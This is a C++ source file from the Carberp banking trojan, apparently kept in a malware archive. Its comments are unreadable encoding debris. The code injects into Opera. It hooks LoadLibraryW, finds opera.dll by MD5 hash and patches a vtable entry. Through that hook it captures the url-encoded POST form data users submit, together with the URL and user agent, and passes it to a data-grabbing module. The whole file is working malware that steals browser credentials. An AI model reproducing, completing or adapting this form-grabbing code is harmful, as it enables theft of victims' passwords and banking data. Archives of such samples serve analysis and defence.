/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>
#include <windowsx.h>

#include "GetApi.h"
#include "Utils.h"
#include "Memory.h"
#include "Strings.h"
#include "BotConfig.h"
#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Splice.h"
#include "Loader.h"
#include "md5.h"

#include "Opera.h"

//#include "BotDebug.h"




template <class STR>
inline void O_DBGOutMessage(STR Str)
{
	#ifdef DebugUtils
		Debug::MessageEx("Opera", 0, NULL, NULL, (PCHAR)Str);
	#endif
}

template <class STR, class ARG1>
inline void O_DBGOutMessage(STR Str, ARG1 Arg1)
{
	#ifdef DebugUtils
		Debug::MessageEx("Opera", 0, NULL, NULL, (PCHAR)Str, Arg1);
	#endif
}


#define ODBG   O_DBGOutMessage<>

// ����� �������������� ������ Opera
static const LONG OperaVerCount = 4;


// ������� ������ �������� opera.dll ��� ������ ������ ��������
// ������������, ���� ������� �� �� ������, ��� � � IDA,
// �� ���������� ������ ��� ��������
#define Opr_11_00_ImgBase		0x67440000
#define Opr_11_01_ImgBase		0x67440000
#define Opr_11_10_ImgBase		0x673C0000
#define Opr_11_11_ImgBase		0x673C0000


// MD5-���� opera.dll ��� ��������� ������ �����:
static BYTE OperaMD5Hashes [OperaVerCount][16] = {
			  0xba, 0xc2, 0x26, 0x29, 0x9e, 0x10, 0x0d, 0x8e,
			  0x47, 0x09, 0xd1, 0xfc, 0xad, 0xe8, 0x96, 0xb9,		// 11.00
			  0x95, 0xce, 0x52, 0x17, 0xd7, 0x39, 0x99, 0x95,
			  0x25, 0xd9, 0x60, 0x30, 0x92, 0x1d, 0xaa, 0xf7,	  // 11.01
			  0x37, 0xD8, 0x0A, 0x46, 0x16, 0xB6, 0xBA, 0xAB,
			  0x2A, 0xF4, 0x6C, 0x87, 0x92, 0x8D, 0xB2, 0x49,		// 11.10
			  0x9C, 0xFB, 0xF6, 0xAC, 0x6D, 0x93, 0xD9, 0x0F,
			  0x07, 0x59, 0x4E, 0xE1, 0x6D, 0x22, 0xE7, 0x38		// 11.11
       };

// ������������� ������ ��������� ��� ���� � opera.dll
static DWORD OperaVAOffsets [OperaVerCount] = {
				0x67E0C604 - Opr_11_00_ImgBase,   // 11.0.1156.0
				0x67E107C4 - Opr_11_01_ImgBase,	  // 11.1.1190.0
				0x67DF54AC - Opr_11_10_ImgBase,	  // 11.10.2092.0
				0x67DF1574 - Opr_11_11_ImgBase	  // 11.11.2109.0
       };

//  GetHookProcRVA - �� ������ MD5-����� ���������� ������ opera.dll
//  � ���������� V-����� ������ ������� ��� 0, � ������ �������
static LONG GetHookProcRVA(PCHAR DllName, HMODULE Module);

// ��� ������� ������� �� ����� ������ ��� Opera
typedef int ( __stdcall *PGetPostProc)(int i1, int iFlag, LPVOID lpMem, int nLen);
typedef HMODULE (WINAPI *PLoadLibraryWProc)(LPCWSTR DllName);

static PGetPostProc  Real_GetPostProc;
static PLoadLibraryWProc Real_LoadLibraryW;


HMODULE OperaDLLModule = NULL; // ����� Opera.dll �� ������� ��� ��������� ���
PCHAR OperaUserAgent = NULL;
PCHAR RequestURL = NULL;
DWORD OldPostProcAddr = 0;

void InitializeOperaGlobalData()
{
	// ���������������� ���������� ������ ��� ���� �������
	OldPostProcAddr = 0;
	OperaUserAgent = NULL;
	RequestURL = NULL;
}



/************************************************************************/
/* ����������� ���������� ���������������� �-� �� opera.dll             */
// � �� �������� ��� �� ������������� ������ GET/POST ��������
//--------------------------------
// ���������:
// i1 - �� ��������, ������ ����� ������� ��������� Self �� ������ ������
// iFlag - �� ��������, �� � ���� opera.dll ����� ���� ��� �� �������
//         ����� ���������� � ���������� 0x17
// lpMem - ��-�� �� ����� � �������
// nLen - ����� ������
//--------------------------------

void __stdcall Hook_GetPostProc(LPVOID lpMem, int nLen)
{
	// ��������, ��� ������� �� ��� ���������, ��� ��� ����������


	PCHAR Request = STR::New((PCHAR)lpMem,(DWORD)nLen);

	// ���������� ��� �������
	PCHAR MethodStr = NULL;
	PCHAR Path = NULL;
	PCHAR Protocol = NULL;
	THTTPMethod Method = hmUnknown;


	if (ParseRequestFirstLine(Request, &MethodStr, &Path, &Protocol))
		Method = GetMethodFromStr(MethodStr);

	// � ������ ���� ������� ���������� ����� �������
	if (Method == hmPOST)
	{
		if (RequestURL != NULL)
			STR::Free(RequestURL);

		// ��������� ��� ��������
		PCHAR CT = HTTPParser::GetHeaderValue(Request, ParamContentType);
		DWORD Hash = CalcHash(CT);

		STR::Free(CT);

		const static DWORD ConentTypeHash = 0x6B3CDFEC; /* application/x-www-form-urlencoded */

		if (Hash == ConentTypeHash) /* url_encoded*/
		{
			// ���������� ����� �����
			if (OperaUserAgent == NULL)
				OperaUserAgent = HTTPParser::GetHeaderValue(Request, ParamUserAgent);

			// ���������� ����� �������
			PCHAR Host = HTTPParser::GetHeaderValue(Request, ParamHost);


			RequestURL = STR::New(4, "http://", Host, "/", Path);

			STR::Free(Host);

			ODBG("POST ������ �� %s", RequestURL);
        }
	}


	// ��������� �� ������������� ��������
	if (Method == hmUnknown && RequestURL != NULL)
	{
		// ������ ���� ������
        ODBG("���������� POST ������ � %s", RequestURL);
        DataGrabber::AddHTMLFormData(RequestURL, Request, OperaUserAgent, BROWSER_TYPE_O, DATA_TYPE_FORM);
	}

	STR::Free2(RequestURL);

	STR::Free(Request);
	STR::Free(MethodStr);
	STR::Free(Path);
	STR::Free(Protocol);

}

/************************************************************************/
bool WINAPI IsOpera()
{
	// ������� ������ ������ ���� ��� ������� � ��������
	// Java.exe ��� Javaw.exe
	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH );

	if ( ModulePath == NULL )
		return false;

	pGetModuleFileNameW(NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = GetNameHash( ModulePath );

	bool Result = dwProcessHash == 0x7A38EBF3; /* opera.exe */

	MemFree(ModulePath);

	return Result;
}
/************************************************************************/

HMODULE WINAPI Hook_LoadLibraryW(LPCWSTR DllName)
{
	HMODULE Module = Real_LoadLibraryW(DllName);

	if (Module != NULL && OperaDLLModule != Module)
	{
		DWORD Hash = CalcHashW((PWCHAR)DllName);
		if (Hash == 0x2506F543 /*opera.dll*/ ||
			Hash == 0x5A38A1FA /*Opera.dll*/ )
		{
			ODBG("������ ���� �� Opera.dll");
            PCHAR DLL = WSTR::ToAnsi((PWCHAR)DllName, 0);

			DWORD HookRVA = GetHookProcRVA(DLL, Module);
			if (HookRVA)
			{
				HookOperaApi(HookRVA);
			}
			else
				ODBG("������ ��������� ������ ������� Opera.dll");

            STR::Free(DLL);

//			if (HookOperaApi())
//				OperaDLLModule = Module;
		}
	}

    return Module;
}

/************************************************************************/

bool HookOperaExe()
{
	static const DWORD HashLoadLibraryW = 0xC8AC8030;
	// ������ ��������� �������� ������
	if ( HookApi(DLL_KERNEL32, HashLoadLibraryW, &Hook_LoadLibraryW) )
	{
		__asm mov [Real_LoadLibraryW], eax
	}
	else
		return false;
	
	OperaDLLModule = NULL;


	ODBG("Opera.exe ���������");

	return true;
}

bool HookOpera()
{
	// ������� ������ ���� �� ������� ������� Opera

	// ���� ������� � ��� �����
	//	1. ������ ������� loadLibrary
	//  2. ����������� �������� Opera.dll � ������ � �������.
	//     ���� ����� ������� Opera.dll �� ��� �������� �������� ����������
	//	   ��������� ���� ���������� � ������������ ����������� ��������

	if ( !IsOpera() )
		return false;
	ODBG("����� ����������");


//	DWORD HookVA = GetHookProcVA();

//	if (HookVA)
//		UnhookOpera(HookVA);

	return HookOperaExe();
}

/************************************************************************/

/************************************************************************/
// ������ DWORD �� ��������� ������ � VTBL opera.dll
// ���������� ���������� �������� ������
DWORD PatchOperaVTBL(DWORD dwAddress, DWORD dwValue)
{
	// ��������� ��������
	DWORD dwRes = 0;

	// �������� �� �������� ��-��
	if (!dwAddress)	return 0;

	// ��������� �� ����� ��������� � VTBL � �� �����, ������� �������� ���������
	DWORD *xAddress, *yAddress = NULL;

	// ��������� ����� ��������� � VTBL
	xAddress = &dwAddress;

	// �������� � ���������� ����� ������������ �-� PostProc
	yAddress = (DWORD *)*xAddress;
	dwRes = (DWORD)*yAddress;

	// ������ ����� � VTBL �� ���� �-�
	DWORD dwOldProtect = 0;
	if (pVirtualProtect(yAddress, sizeof(DWORD), PAGE_READWRITE, &dwOldProtect))
	{
		// ������ �������� �� ������
		*yAddress = dwValue;

		// ���������� �� ����� �������� ������ � �������
		pVirtualProtect(yAddress, sizeof(DWORD), dwOldProtect, &dwOldProtect);
	}

	return dwRes;
}


/************************************************************************/
// ������������ ������� ��� ����������� ��������� ������������
// PostProc, ��������� ��� �������� ������ ����������, �.�.
// � ������ ������� Opera ��� �������� ���������� � ��� �-�
// ������������ �� ������ ����, �� � �������� edi, ecx � ��.
__declspec(naked) void CallHookPostProc()
{
	__asm
	{
		pushad
			push	[esp+8+32] // nLen
			push	[esp+8+32] // lpMem
			call	Hook_GetPostProc
		popad
		jmp		OldPostProcAddr
	}
}



bool HookOperaApi(DWORD HookRVA)
{
	ODBG("������������ ������� Opera.dll");
    InitializeOperaGlobalData();


	OldPostProcAddr = PatchOperaVTBL(HookRVA, (DWORD)&CallHookPostProc);
	if (!OldPostProcAddr)
	{
		return false;
	}

	
//	DWORD HookVA = GetHookProcVA();
//
//	if (HookVA)
//	{
//
//
//
//        InitializeOperaGlobalData();
//
//		if ( HookApi2(DLL_OPERA, HookVA, (DWORD)&Hook_GetPostProc ) )
//		{
//			__asm mov [Real_GetPostProc], eax
//		}
//	}
	ODBG("Opera.dll ���������");
	return true;
}

/************************************************************************/
LONG GetHookProcRVA(PCHAR DllName, HMODULE Module)
{
	// ������ 0, ���� ����� ���������� �� �������
	LONG res = 0;

	// �������� ������ ���� � ����������� opera.dll � ������� � MD5-���

	// ������� ��� �� �����
	TMD5 MD5;
	if (MD5FromFileA(DllName, MD5))
	{
		for (int i = 0; i < OperaVerCount; i++)
		{
			// � ���������� ��� � ���������� ����������
			if (0 == m_memcmp(MD5.Data, OperaMD5Hashes[i], MD5_HASH_SIZE))
			{
				res = (DWORD)Module + OperaVAOffsets[i];
				break;
			}
		}
	}

	return res;
}
